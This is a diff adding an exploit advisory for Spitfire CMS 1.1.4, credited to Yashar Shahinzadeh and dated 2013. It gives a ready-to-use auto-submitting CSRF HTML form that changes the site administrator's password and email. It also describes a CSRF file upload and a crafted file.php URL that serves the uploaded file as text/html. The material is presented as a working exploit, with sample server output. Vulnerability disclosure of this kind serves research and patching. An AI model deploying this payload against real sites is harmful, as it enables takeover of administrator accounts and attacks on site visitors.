@@ -1,0 +1,44 @@
+###################################################################################################################################
+# Exploit Title: spitefire CMS - CSRF / ADD / EDTI / UPLOAD FILE
+# Date: 2013 15 August
+# Exploit Author: Yashar shahinzadeh
+# Special thanks to Mormoroth
+# Credit goes for: http://y-shahinzadeh.ir & ha.cker.ir
+# Vendor Homepage: http://spitfire.clausmuus.de/
+# Tested on: Linux & Windows, PHP 5.2.9
+# Affected Version :  1.1.4
+#
+# Contacts: { http://Twitter.com/YShahinzadeh , http://y-shahinzadeh.ir , http://Twitter.com/Mormoroth , http://mormoroth.ir }
+###################################################################################################################################
+
+Summary:
+========
+1. CSRF - Adding/Editing administrator account / UPLOAD FILE
+
+
+1. CSRF - Adding/Editing administrator account:
+===============================================
+Spitefire cms ain't a well-coded CMS having many errors and low performance... It is not protected from CSRF as attackers are capable of adding/editing administrators account, or ever uploading a file through CSRF. I'm only giving example of chaning administrator's details:
+
+<html>
+	<body onload="submitForm()">
+	<form name="myForm" id="myForm"
+	action="http://localhost/spitfire_site/cms/edit/tpl_user_settings_action.php" method="post">
+	<input type="hidden" name="value[password]" value="arian123">
+	<input type="hidden" name="value[password2]" value="arian123">
+	<input type="hidden" name="value[email]" value="y.shahinzadeh@gmail.com">
+	<input type="hidden" name="action" value="save">
+	</form>
+	<script type='text/javascript'>document.myForm.submit();</script>
+</html>
+
+After issuing exploit, something like that may be appeared:
+status = {'values':{'id':'1','realname':'Administrator','username':'admin','password':'','groups':{'all':'7','1':'4'},'may_edit_users':'1','is_admin':'1','status':'0','is_ldap_user':'0','must_change_password':'','email':'admin@admin.net','language':'en'},'messages':{},'quickbar':{'disabledButtons':{'save':'1','redo':'1'}},'statusbar':{'value':' #1'}};
+
+I would expand on upload procedure, at the beginning of the installing site, the author is forced to give a writable directory for saving files, finding the given directory aint much difficult (default is /site/files/). The upload form doesn't have CSRF token so attacker can upload malicious file containing HTML/JAVA codes. The file will be renamed to a file without any extention after uploading, so only client side exploits and attacks can be conducted. Since file_get_contents() function executes file, the attacker must give the crafted URL which is similar to following URL:
+
+http://localhost/spitfire_site/cms/file.php?cms_id=4&name=logo&type=text/html
+
+text/html is the dangerous part because it's set image/gif as default.
+
+/** Yasshar shahinzadeh **/
